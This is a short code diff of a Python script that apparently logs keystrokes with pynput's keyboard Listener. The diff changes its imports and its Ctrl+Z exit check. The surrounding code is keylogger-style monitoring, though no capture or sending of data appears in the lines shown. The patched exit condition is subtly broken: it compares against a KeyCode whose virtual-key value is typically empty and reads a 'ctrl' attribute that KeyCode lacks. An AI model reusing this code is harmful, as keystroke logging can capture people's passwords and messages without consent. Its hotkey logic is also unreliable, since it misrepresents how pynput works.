@@ -1,7 +1,7 @@
 # Importing necessary modules
 import os, platform, sys
 import time
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Controller, Listener, KeyCode
 
 # Initializing variables
 keys = []
@@ -49,7 +49,7 @@ def on_press(key):
 # Function to check key release event
 def on_release(key):
     # If the 'Ctrl+Z' key combination is pressed, stop logging and exit the program
-    if key == Key.ctrl_z:
+    if hasattr(key, 'vk') and key.vk == KeyCode.from_char('Z').vk and key.ctrl:
         sys.exit()
 
 # Main function
